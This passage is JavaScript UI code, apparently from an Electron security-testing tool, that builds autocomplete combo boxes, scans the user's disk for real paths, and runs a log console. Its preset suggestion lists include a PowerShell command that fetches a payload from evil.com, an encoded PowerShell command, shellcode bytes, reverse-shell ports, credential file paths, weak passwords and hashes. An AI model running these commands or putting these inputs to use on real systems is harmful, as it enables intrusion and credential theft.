            'What is the system status?'
        ],
        // Offensive: Hash ID / Password
        'offensive-hash-input': [
            '5f4dcc3b5aa765d61d8327deb882cf99',
            '098f6bcd4621d373cade4e832627b4f6',
            '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8',
            'b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86',
            'aad3b435b51404eeaad3b435b51404ee',
            '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy',
            'c4ca4238a0b923820dcc509a6f75849b'
        ],
        'offensive-password-input': [
            'CorrectHorseBatteryStaple',
            'Tr0ub4dor&3',
            'P@ssw0rd!2025',
            'Winter2025!Secure',
            'SuperSecret#42',
            'LongSentenceWithManyWordsIsHarderToCrack!',
            'letmein',
            'admin'
        ],
        // Offensive: Wordlist
        'offensive-wordlist-target': ['acme', 'acme-corp', 'example-company', 'target-name'],
        'offensive-wordlist-company': ['Acme Corp', 'Globex', 'Initech', 'Umbrella Corporation'],
        'offensive-wordlist-year': ['2024', '2025', '2026', '1999', '1984'],
        // Offensive: Shell payload
        'offensive-shell-lhost': ['127.0.0.1', '10.0.0.1', '192.168.1.100', '10.10.14.5', '0.0.0.0'],
        'offensive-shell-lport': ['4444', '443', '80', '8080', '53', '1337', '9001', '9999'],
        // Offensive: Payload / Evasion
        'offensive-payload-input': [
            '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68',
            '4841545349474e',
            '4d5a90000300000004000000ffff0000b800000000000000'
        ],
        'offensive-evasion-command': [
            'Invoke-WebRequest -Uri http://evil.com/payload.ps1',
            'powershell -enc SQBFAFgA',
            'Get-Process | Select-Object -First 5',
            'whoami'
        ],
        // Offensive: Wireless
        'offensive-wifi-essid': ['MyNetwork', 'HomeWiFi', 'linksys', 'NETGEAR-5G', 'CoffeeShop_Guest', 'ATT-2F3K1A'],
        'offensive-handshake-frames': ['0200003c010000000000000000000000000000000000000000000000000000000000000000'],
        'offensive-wps-pin': ['12345670', '00000000', '12345678', '87654321', '98765432'],
        // Offensive: Post-exploit / Keys
        'offensive-postexploit-input': ['/etc/passwd', '/etc/sudoers', 'root:x:0:0:root:/root:/bin/bash'],
        'offensive-keys-input': ['/root/.ssh/authorized_keys', '/home/user/.ssh/authorized_keys'],
        // Offensive: Decoys
        'offensive-decoys-real-ip': ['10.0.0.1', '192.168.1.10', '172.16.0.5', '127.0.0.1', '8.8.8.8'],
        'offensive-decoys-count': ['3', '5', '8', '10', '20']
    };

    var comboCatalog = { tools: [], skills: [], loaded: false, loading: false };
    var activeCombo = null;
    var comboIdleTimer = null;
    var comboHoverTimer = null;
    var COMBO_IDLE_MS = 3500;

    // ── Real-path suggestions ────────────────────────────────────────────────
    // Every path field maps to the file extensions it can consume. The app
    // asks the main process to scan all common user folders and ONLY existing
    // paths are offered — no made-up locations.
    var PATH_FIELDS = {
        'tool-input-path': { exts: ['.txt', '.log', '.json', '.jsonl', '.sadb', '.db', '.bin', '.pcap', '.cap', '.md', '.csv', '.xml', '.html', '.yaml', '.yml', '.ini', '.conf', '.config', '.cfg'], withDirs: true },
        'tool-output-path': { exts: ['.txt', '.log', '.json', '.jsonl', '.csv', '.out', '.md'], withDirs: true },
        'plan-config-path': { exts: ['.config', '.conf', '.cfg', '.txt', '.ini', '.toml'], withDirs: true },
        'plan-audit-log': { exts: ['.jsonl', '.log', '.txt', '.json'], withDirs: true },
        'plan-audit-db': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
        'plan-memory': { exts: ['.jsonl', '.json', '.log', '.txt'], withDirs: true },
        'plan-calibration-db': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
        'findings-dest': { exts: ['.jsonl', '.json', '.log', '.txt'], withDirs: true },
        'findings-src': { exts: ['.jsonl', '.json', '.log', '.txt'], withDirs: true },
        'retest-path': { exts: ['.jsonl', '.json', '.log', '.txt'], withDirs: true },
        'audit-log-path': { exts: ['.jsonl', '.log', '.txt', '.json'], withDirs: true },
        'audit-db-path': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
        'findings-db-path': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
        'calibration-db-path': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
        'reasoning-db-path': { exts: ['.sadb', '.db', '.sqlite', '.sqlite3'], withDirs: true },
    };
    var pathScanCache = {}; // key -> { files, dirs, ts, inflight }
    var PATH_SCAN_TTL_MS = 30000;

    function pathScanKeyFor(id) {
        var cfg = PATH_FIELDS[id];
        return (cfg.withDirs ? 'd:' : '') + cfg.exts.slice().sort().join('|');
    }

    function scanRealPaths(id) {
        var cfg = PATH_FIELDS[id];
        if (!cfg || !window.api.scanPaths) return;
        var key = pathScanKeyFor(id);
        var entry = pathScanCache[key];
        var now = Date.now();
        if (entry && entry.inflight === false && now - entry.ts < PATH_SCAN_TTL_MS) return;
        if (!entry) entry = pathScanCache[key] = { files: [], dirs: [], ts: 0, inflight: false };
        if (entry.inflight) return;
        entry.inflight = true;
        window.api.scanPaths({ exts: cfg.exts, withDirs: cfg.withDirs, cap: 300 }).then(function (res) {
            entry.files = (res && res.files) || [];
            entry.dirs = (res && res.dirs) || [];
            entry.ts = Date.now();
            entry.inflight = false;
            // A combo is open on a path field right now — refresh it with the
            // freshly discovered real paths.
            if (activeCombo && PATH_FIELDS[activeCombo.input.id]) {
                renderCombo(activeCombo, activeCombo.input.value);
            }
        }).catch(function () {
            entry.inflight = false;
        });
    }

    function comboHistoryKey(id) { return 'combo-history:' + id; }

    function getComboHistory(id) {
        try {
            var raw = JSON.parse(localStorage.getItem(comboHistoryKey(id)) || '[]');
            return Array.isArray(raw) ? raw : [];
        } catch (_e) { return []; }
    }

    function recordComboHistory(id, value) {
        if (!id || !value) return;
        try {
            var hist = getComboHistory(id).filter(function (v) { return v !== value; });
            hist.unshift(value);
            if (hist.length > 20) hist = hist.slice(0, 20);
            localStorage.setItem(comboHistoryKey(id), JSON.stringify(hist));
        } catch (_e) {}
    }

    function recordPanelInputs(panel) {
        $$('input[type="text"], input[type="number"], textarea', panel).forEach(function (input) {
            if (input.id && input.value && input.value.trim()) {
                recordComboHistory(input.id, input.value.trim());
            }
        });
    }

    function getComboOptions(inputEl) {
        var id = inputEl.id;
        var out = [];
        var seen = {};
        function push(v) {
            if (!v) return;
            v = String(v).trim();
            if (!v || seen[v]) return;
            seen[v] = true;
            out.push(v);
        }
        getComboHistory(id).forEach(push);                       // recent values first
        if (PATH_FIELDS[id]) {
            // Real, existing paths first: matching files, then candidate dirs.
            scanRealPaths(id);
            var scanned = pathScanCache[pathScanKeyFor(id)];
            if (scanned && scanned.files.length + scanned.dirs.length > 0) {
                scanned.files.forEach(push);
                scanned.dirs.slice(0, 30).forEach(push);
            }
        }
        (COMBO_OPTIONS[id] || []).forEach(push);                 // curated examples
        if (id === 'ext-tool-name') {
            if (!comboCatalog.loaded) loadComboCatalog();        // lazy fetch on first use
            comboCatalog.tools.forEach(push);                    // live catalog
        }
        if (id === 'skill-search') {
            if (!comboCatalog.loaded) loadComboCatalog();
            comboCatalog.skills.forEach(push);
        }
        return out;
    }

    function closeCombo() {
        if (comboHoverTimer) { clearTimeout(comboHoverTimer); comboHoverTimer = null; }
        if (activeCombo) {
            activeCombo.menu.style.display = 'none';
            activeCombo.input.classList.remove('combo-open');
            activeCombo = null;
        }
        if (comboIdleTimer) { clearTimeout(comboIdleTimer); comboIdleTimer = null; }
    }

    function armComboIdle() {
        if (comboIdleTimer) clearTimeout(comboIdleTimer);
        comboIdleTimer = setTimeout(function () {
            comboIdleTimer = null;
            if (activeCombo) {
                logUi('info', 'combo collapsed (idle): #' + activeCombo.input.id);
                closeCombo();
            }
        }, COMBO_IDLE_MS);
    }

    function setComboActive(combo, index) {
        var items = combo.menu.querySelectorAll('.combo-item');
        if (!items.length) return;
        if (index < 0) index = items.length - 1;
        if (index >= items.length) index = 0;
        combo.activeIndex = index;
        items.forEach(function (item, i) {
            item.classList.toggle('active', i === index);
        });
        var active = items[index];
        if (active) active.scrollIntoView({ block: 'nearest' });
    }

    function selectComboItem(combo, index) {
        var opt = combo.options && combo.options[index];
        if (opt == null) return;
        combo.input.value = opt;
        recordComboHistory(combo.input.id, opt);
        closeCombo();
        // Keep focus where it is: do NOT refocus here, otherwise the focus
        // handler reopens the menu immediately after Enter selection.
    }

    function renderCombo(combo, filter) {
        combo.menu.innerHTML = '';
        var opts = getComboOptions(combo.input);
        var q = (filter || '').trim().toLowerCase();
        var matches = q
            ? opts.filter(function (o) { return o.toLowerCase().indexOf(q) !== -1; })
            : opts;
        combo.options = matches;
        combo.activeIndex = -1;
        if (!matches.length) {
            var empty = document.createElement('div');
            empty.className = 'combo-empty';
            empty.textContent = q ? 'No suggestions for "' + filter + '"' : 'No suggestions available.';
            combo.menu.appendChild(empty);
            return;
        }
        matches.forEach(function (opt, i) {
            var item = document.createElement('div');
            item.className = 'combo-item';
            item.textContent = opt;
            item.dataset.index = i;
            item.addEventListener('mousedown', function (e) {
                e.preventDefault();
                selectComboItem(combo, Number(item.dataset.index));
            });
            item.addEventListener('mouseenter', function () {
                setComboActive(combo, Number(item.dataset.index));
            });
            combo.menu.appendChild(item);
        });
        setComboActive(combo, 0);
    }

    function openCombo(combo) {
        if (activeCombo && activeCombo !== combo) closeCombo();
        activeCombo = combo;
        renderCombo(combo, combo.input.value);
        combo.menu.style.display = 'block';
        combo.input.classList.add('combo-open');
        armComboIdle();
    }

    function buildComboMenu(inputEl) {
        var wrap = document.createElement('div');
        wrap.className = 'combo-wrap';
        inputEl.parentNode.insertBefore(wrap, inputEl);
        wrap.appendChild(inputEl);
        inputEl.classList.add('combo-input');
        if (inputEl.tagName !== 'TEXTAREA' && inputEl.type !== 'number') {
            inputEl.classList.add('combo-chevron');
        }
        var menu = document.createElement('div');
        menu.className = 'combo-menu';
        menu.style.display = 'none';
        wrap.appendChild(menu);
        return { wrap: wrap, input: inputEl, menu: menu, options: [], activeIndex: -1 };
    }

    function initComboFor(inputEl) {
        var combo = buildComboMenu(inputEl);
        var menuHovered = false;
        var isTextarea = inputEl.tagName === 'TEXTAREA';

        // Click / focus opens the box
        inputEl.addEventListener('click', function () { openCombo(combo); armComboIdle(); });
        inputEl.addEventListener('focus', function () { openCombo(combo); armComboIdle(); });

        // Hover opens after a short delay so transient passes don't pop it up
        inputEl.addEventListener('mouseenter', function () {
            if (comboHoverTimer) clearTimeout(comboHoverTimer);
            comboHoverTimer = setTimeout(function () {
                comboHoverTimer = null;
                if (document.activeElement !== inputEl || inputEl.value === '') {
                    openCombo(combo);
                }
                armComboIdle();
            }, 350);
        });
        inputEl.addEventListener('mouseleave', function () {
            if (comboHoverTimer) { clearTimeout(comboHoverTimer); comboHoverTimer = null; }
            if (activeCombo !== combo) return;
            if (document.activeElement === inputEl && inputEl.value !== '') return; // typing
            setTimeout(function () {
                if (activeCombo === combo && !menuHovered) closeCombo();
            }, 250);
        });

        // Filter as you type
        inputEl.addEventListener('input', function () {
            if (activeCombo === combo) {
                renderCombo(combo, combo.input.value);
                combo.menu.style.display = 'block';
                armComboIdle();
            }
        });

        // Keyboard navigation
        inputEl.addEventListener('keydown', function (e) {
            if (activeCombo !== combo) return;
            if (e.key === 'ArrowDown') {
                e.preventDefault();
                setComboActive(combo, combo.activeIndex + 1);
                armComboIdle();
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                setComboActive(combo, combo.activeIndex - 1);
                armComboIdle();
            } else if (e.key === 'Enter' && !isTextarea) {
                e.preventDefault();
                if (combo.activeIndex >= 0) selectComboItem(combo, combo.activeIndex);
                else closeCombo();
                armComboIdle();
            } else if (e.key === 'Escape') {
                e.preventDefault();
                e.stopPropagation(); // keep the global Escape-to-dashboard from firing
                closeCombo();
            } else if (e.key === 'Tab') {
                closeCombo();
            } else {
                armComboIdle();
            }
        });

        // Menu hover keeps the box open; leaving it closes after a grace period
        combo.menu.addEventListener('mouseenter', function () {
            menuHovered = true;
            armComboIdle();
        });
        combo.menu.addEventListener('mouseleave', function (e) {
            menuHovered = false;
            if (e.relatedTarget && e.relatedTarget.closest && e.relatedTarget.closest('.combo-wrap')) {
                armComboIdle();
                return;
            }
            setTimeout(function () {
                if (activeCombo === combo && !menuHovered) closeCombo();
            }, 200);
        });

        // Losing focus closes the box (unless the pointer is on the menu)
        inputEl.addEventListener('blur', function () {
            setTimeout(function () {
                if (activeCombo === combo && !menuHovered) closeCombo();
            }, 150);
        });
    }

    function loadComboCatalog() {
        if (comboCatalog.loaded || comboCatalog.loading) return;
        comboCatalog.loading = true;
        Promise.all([
            window.api.runCommand(['--list-tools']).catch(function () { return { ok: false, stdout: '' }; }),
            window.api.runCommand(['--list-skills']).catch(function () { return { ok: false, stdout: '' }; })
        ]).then(function (results) {
            if (results[0] && results[0].ok && results[0].stdout) {
                comboCatalog.tools = results[0].stdout.split('\n')
                    .map(function (line) { return (line.split('\t')[0] || '').trim(); })
                    .filter(function (n) { return n.length > 0; });
            }
            if (results[1] && results[1].ok && results[1].stdout) {
                comboCatalog.skills = results[1].stdout.split('\n')
                    .map(function (s) { return s.trim(); })
                    .filter(function (s) { return s.length > 0; });
            }
            comboCatalog.loaded = true;
            comboCatalog.loading = false;
            logUi('info', 'Combo catalog loaded: ' + comboCatalog.tools.length + ' tools, ' + comboCatalog.skills.length + ' skills');
            // Refresh a tool/skill combo that is open right now so catalog entries appear live.
            if (activeCombo && (activeCombo.input.id === 'ext-tool-name' || activeCombo.input.id === 'skill-search')) {
                renderCombo(activeCombo, activeCombo.input.value);
            }
        }).catch(function () {
            comboCatalog.loading = false;
        });
    }

    function initComboBoxes() {
        $$('#main-content input[type="text"], #main-content input[type="number"], #main-content textarea')
            .forEach(function (input) { initComboFor(input); });

        // Close on interaction outside the combo
        document.addEventListener('mousedown', function (e) {
            if (activeCombo && e.target.closest && !e.target.closest('.combo-wrap')) closeCombo();
        });

        // Any activity anywhere resets the idle-collapse timer
        ['mousemove', 'keydown', 'mousedown', 'wheel'].forEach(function (evt) {
            document.addEventListener(evt, function () {
                if (activeCombo) armComboIdle();
            }, { passive: true });
        });

        // Record the values used by any tool into per-field history
        document.addEventListener('click', function (e) {
            var btn = e.target.closest && e.target.closest('button.btn');
            if (btn) {
                var panel = btn.closest('.panel');
                if (panel) recordPanelInputs(panel);
            }
        });

        // Catalog loads lazily on first use of #ext-tool-name / #skill-search (see getComboOptions).
        logUi('info', 'Combo boxes initialized for ' + $$('#main-content .combo-wrap').length + ' fields (catalog loads lazily).');
    }

    // ── Verbose Log Console ────────────────────────────────────────────────

    var logConsole = $('#log-console');
    var logContent = $('#log-content');
    var logBadge = $('#log-badge');
    var logCount = 0;
    var logMaxLines = 500;

    function renderLogEntry(entry) {
        var line = document.createElement('div');
        line.className = 'log-line log-' + (entry.level || 'info');
        var ts = document.createElement('span');
        ts.className = 'log-ts';
        ts.textContent = new Date(entry.ts || Date.now()).toLocaleTimeString();
        var lvl = document.createElement('span');
        lvl.className = 'log-level';
        lvl.textContent = (entry.level || 'info').toUpperCase();
        line.appendChild(ts);
        line.appendChild(lvl);
        line.appendChild(document.createTextNode(entry.message || ''));
        logContent.appendChild(line);

        logCount++;
        if (logBadge) logBadge.textContent = logCount;
        while (logContent.children.length > logMaxLines) {
            logContent.removeChild(logContent.firstChild);
        }
        logContent.scrollTop = logContent.scrollHeight;
    }

    function logUi(level, message) {
        renderLogEntry({ ts: Date.now(), level: level, message: message });
    }

    // Capture renderer-side console activity into the log console too.
    ['error', 'warn', 'log'].forEach(function (method) {
        var original = console[method];
        console[method] = function () {
            try {
                var args = Array.prototype.slice.call(arguments);
                var msg = args.map(function (a) {
                    try { return typeof a === 'string' ? a : JSON.stringify(a); }
                    catch (_e) { return String(a); }
                }).join(' ');
                renderLogEntry({ ts: Date.now(), level: method === 'log' ? 'info' : method, message: '[renderer] ' + msg });
            } catch (_e) { /* never let logging break the app */ }
            return original.apply(console, arguments);
        };
    });

    window.addEventListener('error', function (e) {
        renderLogEntry({ ts: Date.now(), level: 'error', message: '[renderer] Uncaught: ' + (e.message || 'error') + ' @ ' + (e.filename || '') + ':' + (e.lineno || '?') });
    });
    window.addEventListener('unhandledrejection', function (e) {
        renderLogEntry({ ts: Date.now(), level: 'error', message: '[renderer] Unhandled rejection: ' + String(e.reason) });
    });

    if (window.api && window.api.onLogLine) {
        window.api.onLogLine(function (entry) {
            renderLogEntry(entry);
        });
        // Pull any buffered main-process log lines captured before we connected.
        window.api.getLogs().then(function (logs) {
            (logs || []).forEach(function (entry) {
                if (entry && typeof entry.message === 'string') renderLogEntry(entry);
            });
        }).catch(function () {});
    }

    $('#log-toggle').addEventListener('click', function () {
        logConsole.classList.toggle('collapsed');
    });

    $('#log-clear').addEventListener('click', function () {
        logContent.innerHTML = '';
        logCount = 0;
        if (logBadge) logBadge.textContent = '0';
    });

    logUi('info', 'Renderer initialized — subscribing to verbose logs.');

    // ── Init ──────────────────────────────────────────────────────────────

    initComboBoxes();
    loadDashboard();
})();
